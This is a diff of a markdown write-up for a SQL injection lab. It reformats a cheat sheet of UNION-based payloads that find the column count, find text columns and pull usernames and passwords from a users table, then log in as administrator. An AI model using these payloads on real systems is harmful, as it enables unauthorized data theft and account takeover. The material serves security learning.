@@ -357,13 +357,15 @@ Now inject the following to exfiltrate data from the users table:
 💡 Login as Administrator
 Use the credentials you retrieved to log in as the administrator through the provided login form.
 
-🧩 Injection Cheat Sheet
-                  Injection Type	                                         Payload Description
-Number of Columns	  ' UNION SELECT NULL,NULL--	                      Determines correct column count
-Find Text Columns	  ' UNION SELECT 'abc','def'--	                    Identifies text-rendering columns
-Extract Data	      ' UNION SELECT username, password FROM users--	  Retrieves data from users table
+## 🧩 Injection Cheat Sheet
 
-### ✅ Lab Status
+| Injection Type     | Payload                                              | Description                          |
+|--------------------|------------------------------------------------------|--------------------------------------|
+| Number of Columns  | `' UNION SELECT NULL,NULL--`                         | Determines correct column count      |
+| Find Text Columns  | `' UNION SELECT 'abc','def'--`                       | Identifies text-rendering columns    |
+| Extract Data       | `' UNION SELECT username, password FROM users--`     | Retrieves data from users table      |
+
+## ✅ Lab Status
 ✔️ Completed – Successfully exploited SQLi to extract user data and logged in as the administrator.
 
 
